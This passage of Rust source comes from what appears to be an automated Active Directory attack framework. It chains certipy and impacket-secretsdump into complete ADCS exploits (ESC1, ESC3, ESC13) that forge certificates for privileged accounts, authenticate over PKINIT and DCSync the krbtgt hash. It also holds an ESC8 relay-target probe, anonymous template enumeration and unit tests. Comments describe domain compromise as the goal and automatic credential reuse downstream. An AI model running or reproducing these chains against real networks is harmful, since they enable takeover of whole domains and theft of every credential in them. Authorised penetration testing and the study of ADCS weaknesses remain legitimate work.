    if !cwd.join(&agent_pfx).exists() {
        // Exit-0-with-no-PFX (see the ESC1 chain note): certipy reports success
        // on RPC failure / pending / denial. Surface its output so the operator
        // sees why the enrollment-agent cert never issued.
        anyhow::bail!(
            "certipy req (agent enrollment) exited 0 but no PFX ({agent_pfx}) was produced — \
             cert NOT issued (wrong CA host / pending approval / denied). \
             certipy stdout: {} || stderr: {}",
            agent_output.stdout.trim(),
            agent_output.stderr.trim(),
        );
    }

    // certipy's `-on-behalf-of` wants `NETBIOS\principal`, NOT the DNS/FQDN
    // domain. Passing `contoso.local\administrator` makes certipy warn
    // "Domain part of '-on-behalf-of' should not be a FQDN" and the CA policy
    // module denies the request (0x80070547 "Denied by Policy Module"), so no
    // on-behalf-of cert issues — the whole ESC3 chain fails. Derive the NetBIOS
    // name from the first DNS label, uppercased (contoso.local -> CONTOSO), unless
    // an explicit flat name is supplied. The single-backslash escape becomes a
    // literal `\` on the command line.
    let nt_domain = on_behalf_nt_domain(args, domain);
    let on_behalf_target = format!("{nt_domain}\\{on_behalf_of}");
    let request_output = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", on_behalf_template)
        .flag("-dc-ip", dc_ip)
        .flag("-on-behalf-of", &on_behalf_target)
        .flag_visible("-pfx", &agent_pfx)
        .flag("-out", &target_out)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !request_output.success {
        let agent_label = format!("Agent enrollment ({agent_template})");
        let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
        let (stdout, stderr) = render_chain_output(&[
            (&agent_label, &agent_output),
            (&on_behalf_label, &request_output),
        ]);
        return Ok(ToolOutput {
            stdout,
            stderr,
            exit_code: request_output.exit_code,
            success: false,
        });
    }
    if !cwd.join(&target_pfx).exists() {
        // Exit-0-with-no-PFX (see the ESC1 chain note). Surface certipy output.
        anyhow::bail!(
            "certipy req (on-behalf-of) exited 0 but no PFX ({target_pfx}) was produced — \
             cert NOT issued (wrong CA host / pending approval / denied). \
             certipy stdout: {} || stderr: {}",
            request_output.stdout.trim(),
            request_output.stderr.trim(),
        );
    }

    // certipy auth writes <subject>.ccache in CWD; clear stale .ccache to
    // avoid the interactive overwrite prompt that kills non-interactive
    // runs (matches what `certipy_auth` does at module level).
    remove_ccache_files(Some(&cwd)).await;
    let auth_output = certipy("auth")
        .flag_visible("-pfx", &target_pfx)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;

    let agent_label = format!("Agent enrollment ({agent_template})");
    let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
    let (combined_stdout, combined_stderr) = render_chain_output(&[
        (&agent_label, &agent_output),
        (&on_behalf_label, &request_output),
        ("certipy auth", &auth_output),
    ]);
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: agent_output.success && request_output.success && auth_output.success,
    })
}

/// Full ESC13 (issuance-policy → group link) exploitation chain in one shot:
/// enroll the template AS THE LOW-PRIV USER (no subject/SID override), PKINIT-auth
/// with the resulting cert, then DCSync `krbtgt` with the now-elevated ccache.
///
/// ESC13 is fundamentally different from ESC1. The vulnerable template's issuance
/// policy OID is linked (`msDS-OIDToGroupLink`) to a privileged AD group, so a
/// cert issued to the *enrolling* user carries that OID and the DC adds the linked
/// group's SID to the PKINIT TGT's PAC — no impersonation needed. Passing
/// `-upn`/`-sid` here (ESC1 semantics) is wrong: it makes the CA policy module
/// deny the request (`0x80070547`) or trips KB5014754 strict mapping (the cert's
/// Security-Extension SID is the requester's, not the target's). So we enroll
/// plainly and let the OID do the work, then DCSync as the enrolling user — whose
/// TGT now carries the elevated group.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `target`/`ca_host` (CA host when it isn't the DC),
///                `dc_host` (DC FQDN — required for the DCSync tail).
pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    // DC FQDN for the Kerberos-authenticated DCSync tail — secretsdump's `-k`
    // target MUST be the DC's FQDN (an IP yields KDC_ERR_S_PRINCIPAL_UNKNOWN).
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    let user_at_domain = format!("{username}@{domain}");
    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC13 chain")?;
    let cwd = tempdir.path().to_path_buf();

    let ts = unique_run_token();
    let out_name = format!("esc13_{ts}");
    let pfx_name = format!("{out_name}.pfx");

    // Plain enrollment — NO `-upn`/`-sid`. The issuance-policy OID on the template
    // is what grants the privileged group at auth time.
    let request_output = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !request_output.success {
        return Ok(request_output);
    }
    if !cwd.join(&pfx_name).exists() {
        anyhow::bail!(
            "certipy req (ESC13, template={template}) exited 0 but no PFX ({pfx_name}) was \
             produced — cert NOT issued (wrong CA host / pending approval / enrollment denied). \
             certipy stdout: {} || stderr: {}",
            request_output.stdout.trim(),
            request_output.stderr.trim(),
        );
    }

    // PKINIT auth AS the enrolling user — the DC stamps the OID-linked group SID
    // into the TGT's PAC. Retry the ~50% KRB_AP_ERR_MODIFIED flake (see ESC1).
    let mut auth_output;
    let mut auth_attempts = 0;
    loop {
        auth_attempts += 1;
        auth_output = certipy("auth")
            .flag_visible("-pfx", &pfx_name)
            .flag("-dc-ip", dc_ip)
            .flag("-domain", domain)
            .flag("-username", username)
            .current_dir(&cwd)
            .timeout_secs(120)
            .execute()
            .await?;
        let transient = auth_output.stdout.contains("KRB_AP_ERR_MODIFIED")
            || auth_output.stderr.contains("KRB_AP_ERR_MODIFIED");
        if !transient || auth_attempts >= 4 {
            break;
        }
    }

    let req_label = format!("certipy req (ESC13, template={template})");
    let auth_label = format!("certipy auth ({pfx_name})");

    // DCSync tail: the elevated ccache (the enrolling user's TGT now carries the
    // OID-linked group, e.g. Domain Admins) DCSyncs `krbtgt`. Unlike ESC1 there is
    // no impersonated principal — we DCSync AS the enrolling user. Skipped when no
    // `dc_host` or no ccache landed.
    let ccache = find_pkinit_ccache(&cwd, &user_at_domain);
    let dcsync_output = match (dc_host, ccache.as_deref()) {
        (Some(dc_fqdn), Some(ccache_path)) => {
            let target_str = format!("{domain}/{username}@{dc_fqdn}");
            let out = CommandBuilder::new("impacket-secretsdump")
                .arg("-k")
                .arg("-no-pass")
                .arg(&target_str)
                .flag("-dc-ip", dc_ip)
                .flag("-just-dc-user", "krbtgt")
                .env("KRB5CCNAME", ccache_path)
                .current_dir(&cwd)
                .timeout_secs(180)
                .execute()
                .await?;
            Some((
                format!("secretsdump krbtgt DCSync (target={target_str})"),
                out,
            ))
        }
        _ => None,
    };

    let dcsync_label = dcsync_output.as_ref().map(|(label, _)| label.clone());
    let mut steps: Vec<(&str, &ToolOutput)> =
        vec![(&req_label, &request_output), (&auth_label, &auth_output)];
    if let (Some(label), Some((_, out))) = (&dcsync_label, &dcsync_output) {
        steps.push((label.as_str(), out));
    }
    let (combined_stdout, combined_stderr) = render_chain_output(&steps);

    // Success = the DCSync tail dumped krbtgt (the authoritative compromise
    // signal). With no tail, fall back to `certipy auth` recovering a hash.
    let got_nt_hash = auth_output.stdout.contains("Got hash for");
    let (exit_code, overall_success) = match &dcsync_output {
        Some((_, out)) => (out.exit_code, request_output.success && out.success),
        None => (
            auth_output.exit_code,
            request_output.success && auth_output.success && got_nt_hash,
        ),
    };
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code,
        success: overall_success,
    })
}

/// Single-spawn ESC1 chain: request an ESC1 cert with an arbitrary UPN+SID,
/// then authenticate it to obtain the impersonated principal's NTLM hash.
///
/// The two steps must share CWD because `certipy auth` derives its ccache
/// filename from the cert subject and won't overwrite. The combined output
/// lets a downstream parser extract the resulting hash and publish it to
/// state as a regular `Hash` discovery — `auto_credential_reuse` then
/// DCSyncs the foreign DC with that hash without any further automation.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`,
///                `dc_ip`, `upn`, `sid`
/// Optional args: `target` (CA server hostname/IP — required when the CA
///                runs on a host other than the DC, as with most multi-tier
///                AD deployments).
pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = required_str(args, "upn")?;
    let sid = required_str(args, "sid")?;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    // DC FQDN for the Kerberos-authenticated DCSync tail. When the target
    // forest's KDC disables RC4 (e.g. a hardened forest root), `certipy auth`
    // obtains a valid TGT but CANNOT recover the impersonated principal's NT
    // hash via u2u — it prints `KDC_ERR_ETYPE_NOSUPP` and exits 0 with only a
    // ccache. The NT hash never appears, so a chain that stops at `certipy
    // auth` looks like a failure even though it holds an Administrator TGT.
    // With `dc_host` present we DCSync `krbtgt` directly with that ccache
    // (secretsdump `-k -no-pass -just-dc-user krbtgt`), which is the actual
    // domain-compromise primitive. secretsdump's Kerberos target MUST be the
    // DC's FQDN — an IP yields `KDC_ERR_S_PRINCIPAL_UNKNOWN`.
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    let user_at_domain = format!("{username}@{domain}");
    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC1 chain")?;
    let cwd = tempdir.path().to_path_buf();

    let ts = unique_run_token();
    let out_name = format!("esc1_{ts}");
    let pfx_name = format!("{out_name}.pfx");

    // KB5014754 strict mapping requires -upn + -sid on the request.
    let request_output = certipy("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-upn", upn)
        .flag("-sid", sid)
        .flag("-out", &out_name)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !request_output.success {
        return Ok(request_output);
    }
    if !cwd.join(&pfx_name).exists() {
        // certipy's `req` CLI exits 0 even when the cert was NOT issued: an RPC
        // transport failure (EPT_S_NOT_REGISTERED — the target host runs no
        // certsvc, i.e. the request hit the DC instead of the real CA server),
        // pending manager approval, or a policy/rights denial all leave exit 0
        // with no PFX. Surface certipy's own stdout/stderr so the reason is
        // diagnosable instead of a bare "no PFX" that costs blind retries.
        anyhow::bail!(
            "certipy req exited 0 but no PFX ({pfx_name}) was produced — cert NOT issued. \
             Likely wrong CA host (EPT_S_NOT_REGISTERED = no certsvc on target; aim at the CA, \
             not the DC), pending approval, or enrollment denied. \
             certipy stdout: {} || stderr: {}",
            request_output.stdout.trim(),
            request_output.stderr.trim(),
        );
    }

    // Pass the bare sAMAccountName (split from the UPN) as certipy's -username
    // so the client principal is pinned explicitly rather than inferred from the
    // PFX. This does NOT fix the KRB_AP_ERR_MODIFIED flake: an A/B test showed
    // the AS-REP failure is ~50% and independent of -username (it recurred with
    // the flag and succeeded without it). The retry loop below is the actual fix
    // — the flag is kept only as a harmless explicit principal override. (SID-
    // mapped UnPAC may still fail ETYPE_NOSUPP on RC4-disabled KDCs — that path
    // is handled by the DCSync tail.)
    let auth_user = upn.split('@').next().unwrap_or("administrator");
    // certipy PKINIT intermittently fails the AS exchange with KRB_AP_ERR_MODIFIED
    // ("Message stream modified") — a transient DH/session-key mismatch (~50% per
    // attempt on some AES-only KDCs). Each attempt re-runs the exchange with fresh
    // randomness, so retry a few times; one flaky auth otherwise sinks the whole
    // chain (no ccache -> no DCSync tail) and burns a per-vuln failure slot.
    let mut auth_output;
    let mut auth_attempts = 0;
    loop {
        auth_attempts += 1;
        auth_output = certipy("auth")
            .flag_visible("-pfx", &pfx_name)
            .flag("-dc-ip", dc_ip)
            .flag("-domain", domain)
            .flag("-username", auth_user)
            .current_dir(&cwd)
            .timeout_secs(120)
            .execute()
            .await?;
        let transient = auth_output.stdout.contains("KRB_AP_ERR_MODIFIED")
            || auth_output.stderr.contains("KRB_AP_ERR_MODIFIED");
        if !transient || auth_attempts >= 4 {
            break;
        }
    }

    let req_label = format!("certipy req (ESC1, upn={upn}, sid={sid})");
    let auth_label = format!("certipy auth ({pfx_name})");

    // DCSync tail: when `certipy auth` recovered the NT hash (RC4-enabled KDC),
    // the combined output already carries a `Got hash for` line and the parser
    // publishes it — no DCSync needed. When it did NOT (RC4-disabled KDC prints
    // `KDC_ERR_ETYPE_NOSUPP`), the ccache is still a valid Administrator TGT;
    // use it to DCSync `krbtgt` so the target forest still falls. Skipped when
    // no `dc_host` (older/LLM dispatch) or no ccache landed.
    let got_nt_hash = auth_output.stdout.contains("Got hash for");
    let ccache = find_pkinit_ccache(&cwd, upn);
    let dcsync_output = match (got_nt_hash, dc_host, ccache.as_deref()) {
        (false, Some(dc_fqdn), Some(ccache_path)) => {
            let dcsync_user = upn.split('@').next().unwrap_or("administrator");
            let target_str = format!("{domain}/{dcsync_user}@{dc_fqdn}");
            let out = CommandBuilder::new("impacket-secretsdump")
                .arg("-k")
                .arg("-no-pass")
                .arg(&target_str)
                .flag("-dc-ip", dc_ip)
                .flag("-just-dc-user", "krbtgt")
                .env("KRB5CCNAME", ccache_path)
                .current_dir(&cwd)
                .timeout_secs(180)
                .execute()
                .await?;
            Some((
                format!("secretsdump krbtgt DCSync (target={target_str})"),
                out,
            ))
        }
        _ => None,
    };

    // Declared before `steps` so it outlives the borrow `steps` takes of it.
    let dcsync_label = dcsync_output.as_ref().map(|(label, _)| label.clone());
    let mut steps: Vec<(&str, &ToolOutput)> =
        vec![(&req_label, &request_output), (&auth_label, &auth_output)];
    if let (Some(label), Some((_, out))) = (&dcsync_label, &dcsync_output) {
        steps.push((label.as_str(), out));
    }
    let (combined_stdout, combined_stderr) = render_chain_output(&steps);

    // Success + exit-code selection. On RC4-disabled KDCs `certipy auth` exits
    // NON-ZERO (UnPAC prints KDC_ERR_ETYPE_NOSUPP) even though it produced a
    // valid Administrator ccache — so `auth_output.success` must NOT veto the
    // chain. When the DCSync tail ran, that step is the authoritative
    // domain-compromise signal (it dumped krbtgt). Only when no tail ran do we
    // fall back to requiring a clean auth that actually recovered an NT hash;
    // an exit-0 auth that published neither a hash nor a DCSync must report
    // failure so the vuln is retried instead of being deduped as done.
    let (exit_code, overall_success) = match &dcsync_output {
        Some((_, out)) => (out.exit_code, request_output.success && out.success),
        None => (
            auth_output.exit_code,
            request_output.success && auth_output.success && got_nt_hash,
        ),
    };
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code,
        success: overall_success,
    })
}

/// Locate the ccache `certipy auth` wrote in `cwd`. certipy names it after the
/// impersonated principal (the `-upn` sAMAccountName, e.g. `administrator` →
/// `administrator.ccache`), but casing and future certipy versions vary, so
/// prefer that exact name and fall back to any `*.ccache` in the directory.
fn find_pkinit_ccache(cwd: &std::path::Path, upn: &str) -> Option<String> {
    let user = upn.split('@').next().unwrap_or("").to_lowercase();
    if !user.is_empty() {
        let expected = cwd.join(format!("{user}.ccache"));
        if expected.exists() {
            return Some(expected.to_string_lossy().into_owned());
        }
    }
    let entries = std::fs::read_dir(cwd).ok()?;
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("ccache") {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

/// Unauthenticated probe for ESC8 (ADCS HTTP web enrollment) exposure.
///
/// Sends an HTTP HEAD to `/certsrv/certfnsh.asp` and reports whether the
/// endpoint advertises NTLM authentication in the `WWW-Authenticate` header.
/// A confirmed hit means the host is a viable NTLM-relay target (PetitPotam →
/// ntlmrelayx `-t http://<host>/certsrv/certfnsh.asp` → cert issuance) with
/// zero pre-auth. The orchestrator publishes a `discoveries[]` entry with
/// `vuln_type=esc8` on success so `auto_coercion` can queue the actual chain.
///
/// Required args: `target` (CA host IP or hostname)
/// Optional args: `port` (default 80), `scheme` (`http` or `https`; default
///                `http` — enrollment web is usually plain HTTP)
pub async fn esc8_relay_probe(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let scheme = optional_str(args, "scheme").unwrap_or("http");
    let port = args
        .get("port")
        .and_then(|v| v.as_u64())
        .unwrap_or(if scheme == "https" { 443 } else { 80 });

    let url = format!("{scheme}://{target}:{port}/certsrv/certfnsh.asp");
    esc8_probe_url(&url).await
}

/// Perform the HTTP HEAD probe against `url` and format the result as a
/// `ToolOutput`. Split from `esc8_relay_probe` so tests can drive the
/// formatter without exercising the arg-parsing layer.
async fn esc8_probe_url(url: &str) -> Result<ToolOutput> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .connect_timeout(std::time::Duration::from_secs(5))
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .context("build reqwest client")?;

    let resp = match client.head(url).send().await {
        Ok(r) => r,
        Err(e) => {
            return Ok(ToolOutput {
                stdout: format!("esc8_relay_probe: {url} unreachable ({e})\n"),
                stderr: String::new(),
                exit_code: Some(1),
                success: false,
            });
        }
    };

    let status = resp.status();
    let www_auth = resp
        .headers()
        .get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    let ntlm_offered = www_auth.split(',').any(|s| {
        s.trim().eq_ignore_ascii_case("NTLM") || s.trim().to_lowercase().starts_with("ntlm ")
    });

    let verdict = if ntlm_offered {
        "ESC8_CANDIDATE: NTLM offered on /certsrv — relay target confirmed"
    } else if status.as_u16() == 401 {
        "endpoint present but no NTLM scheme advertised"
    } else if status.is_success() || status.as_u16() == 405 {
        "endpoint reachable, no auth required (unexpected — likely not an ADCS web enrollment)"
    } else {
        "endpoint returned unexpected status"
    };

    Ok(ToolOutput {
        stdout: format!(
            "esc8_relay_probe url={url} status={status} www_authenticate={www_auth:?} verdict={verdict}\n"
        ),
        stderr: String::new(),
        exit_code: Some(0),
        success: ntlm_offered,
    })
}

/// Unauthenticated Certipy enumeration.
///
/// Runs `certipy find -u '' -p '' -target-ip <dc_ip> -stdout` — some ADCS
/// deployments permit anonymous LDAP queries and will surface template / CA
/// names without any credential. Any hit is passed through the same
/// `parse_certipy_find` pipeline as the authenticated tool, so ESC-labeled
/// templates surface as vulns automatically.
///
/// Required args: `domain`, `dc_ip`
pub async fn certipy_find_anon(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;

    certipy("find")
        .flag("-u", format!("@{domain}"))
        .flag("-p", "")
        .flag("-target-ip", dc_ip)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg("-stdout")
        .arg("-vulnerable")
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // --- certipy_find ---

    #[test]
    fn certipy_find_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    // --- certipy_esc7_full_chain identity composition ---

    #[test]
    fn esc7_binds_a_trust_sourced_credential_in_its_own_realm() {
        assert_eq!(
            super::esc7_auth_identity("carol", "child.contoso.local"),
            "carol@child.contoso.local"
        );
    }

    #[test]
    fn esc7_auth_domain_defaults_to_the_ca_domain() {
        let args = json!({
            "username": "carol",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "ca": "CONTOSO-CA"
        });
        let auth_domain = optional_str(&args, "auth_domain")
            .filter(|d| !d.trim().is_empty())
            .unwrap_or(required_str(&args, "domain").expect("domain present"));
        assert_eq!(auth_domain, "contoso.local");
        assert_eq!(
            super::esc7_auth_identity("carol", auth_domain),
            "carol@contoso.local"
        );
    }

    #[test]
    fn esc7_keeps_a_realm_the_caller_already_supplied() {
        assert_eq!(
            super::esc7_auth_identity("carol@child.contoso.local", "contoso.local"),
            "carol@child.contoso.local"
        );
    }

    #[test]
    fn esc7_add_officer_takes_the_bare_sam_account_name() {
        assert_eq!(super::bare_sam("carol@child.contoso.local"), "carol");
        assert_eq!(super::bare_sam("carol"), "carol");
    }

    #[test]
    fn certipy_find_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_find_missing_password() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn certipy_find_missing_dc_ip() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_find_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_find_vulnerable_default_false() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(!vulnerable);
    }

    #[test]
    fn certipy_find_vulnerable_set_true() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "vulnerable": true
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(vulnerable);
    }

    // --- certipy_request ---

    #[test]
    fn certipy_request_missing_ca() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "ca").is_err());
    }

    #[test]
    fn certipy_request_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_request_user_at_domain_format() {
        let args = json!({
            "username": "lowpriv",
            "domain": "contoso.local",
            "password": "Secret123",
            "ca": "corp-CA",
            "template": "VulnTemplate",
            "dc_ip": "192.168.58.1"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "lowpriv@contoso.local");
    }

    #[test]
    fn certipy_request_upn_present() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10",
            "upn": "administrator@contoso.local"
        });
        assert_eq!(
            optional_str(&args, "upn"),
            Some("administrator@contoso.local")
        );
    }

    #[test]
    fn certipy_request_upn_absent() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "upn").is_none());
    }

    // --- certipy_auth ---

    #[test]
    fn certipy_auth_missing_pfx_path() {
        let args = json!({
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "pfx_path").is_err());
    }

    #[test]
    fn certipy_auth_missing_dc_ip() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_auth_missing_domain() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_auth_all_args() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
    }

    fn certipy_auth_flag(args: &serde_json::Value, flag: &str) -> Option<String> {
        let cmd = super::build_certipy_auth(args).unwrap();
        let argv = cmd.args_for_test();
        let idx = argv.iter().position(|a| a == flag)?;
        argv.get(idx + 1).cloned()
    }

    #[test]
    fn certipy_auth_unlocks_a_pywhisker_pfx() {
        let args = json!({
            "pfx_path": SHADOW_CRED_PFX,
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(
            certipy_auth_flag(&args, "-password").as_deref(),
            Some(crate::acl::SHADOW_CRED_PFX_PASSPHRASE)
        );
    }

    const SHADOW_CRED_PFX: &str = "/tmp/ares_shadowcred_1754000000000-4242-0_svc_sql.pfx";

    #[test]
    fn certipy_auth_names_the_identity_a_pywhisker_certificate_omits() {
        let args = json!({
            "pfx_path": SHADOW_CRED_PFX,
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(
            certipy_auth_flag(&args, "-username").as_deref(),
            Some("svc_sql"),
            "pywhisker's self-signed certificate has no SAN, so certipy finds no \
             identity in it and aborts before it ever reaches the KDC"
        );
        assert_eq!(
            certipy_auth_flag(&args, "-domain").as_deref(),
            Some("contoso.local"),
            "certipy builds the PKINIT principal by joining -username and -domain"
        );
    }

    #[test]
    fn certipy_auth_carries_a_machine_account_marker_through() {
        let args = json!({
            "pfx_path": "/tmp/ares_shadowcred_1754000000000-4242-1_dc01$.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(
            certipy_auth_flag(&args, "-username").as_deref(),
            Some("dc01$")
        );
    }

    #[test]
    fn certipy_auth_leaves_an_adcs_pfx_unchanged() {
        let args = json!({
            "pfx_path": "/tmp/cert_ESC1_1754000000000.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local",
            "username": "alice"
        });
        assert!(certipy_auth_flag(&args, "-password").is_none());
        let cmd = super::build_certipy_auth(&args).unwrap();
        assert_eq!(
            cmd.args_for_test(),
            [
                "auth",
                "-pfx",
                "/tmp/cert_ESC1_1754000000000.pfx",
                "-dc-ip",
                "192.168.58.10",
                "-domain",
                "contoso.local"
            ],
            "an ESC chain passes the enrolling account in `username`; sending it as \
             -username would contradict the certificate's own UPN"
        );
    }

    #[test]
    fn every_certipy_builder_answers_the_overwrite_prompt() {
        let auth = super::build_certipy_auth(&json!({
            "pfx_path": SHADOW_CRED_PFX,
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        }))
        .unwrap();
        let req = super::build_certipy_request_command(&json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-CA01-CA",
            "template": "User",
            "dc_ip": "192.168.58.10"
        }))
        .unwrap();
        let shadow = super::build_certipy_shadow_command(&json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target": "svc_sql",
            "dc_ip": "192.168.58.10"
        }))
        .unwrap();
        let retrieve = super::build_certipy_retrieve_command(&json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-CA01-CA",
            "dc_ip": "192.168.58.10",
            "request_id": 3348
        }))
        .unwrap();
        let forge = super::build_certipy_forge_command(&json!({
            "ca_pfx": "/tmp/contoso-CA01-CA.pfx",
            "upn": "admin@contoso.local"
        }))
        .unwrap();
        let template = super::build_certipy_template_esc4_command(&json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "User",
            "dc_ip": "192.168.58.10"
        }))
        .unwrap();
        let ca = super::build_certipy_ca_command(&json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "ca": "contoso-CA01-CA",
            "backup": true
        }))
        .unwrap();
        for cmd in [auth, req, shadow, retrieve, forge, template, ca] {
            assert_eq!(
                cmd.stdin_for_test(),
                Some(super::CERTIPY_PROMPT_ANSWERS),
                "certipy prompts on every output whose name already exists, and a \
                 tool child's stdin is null: the prompt raises EOFError and takes \
                 the run down after the attack has already landed"
            );
        }
    }

    #[test]
    fn no_certipy_child_is_spawned_outside_the_prompt_answering_constructor() {
        let source = include_str!("adcs.rs");
        let raw = source
            .lines()
            .filter(|line| line.contains("CommandBuilder::new(\"certipy\")"))
            .count();
        assert_eq!(
            raw, 1,
            "every certipy invocation must go through `certipy()`; a bare \
             CommandBuilder inherits the null stdin that turns certipy's \
             overwrite prompt into an EOFError and throws away an issued \
             certificate"
        );
    }

    #[test]
    fn certipy_retrieve_keeps_the_request_id_and_a_fresh_stem() {
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
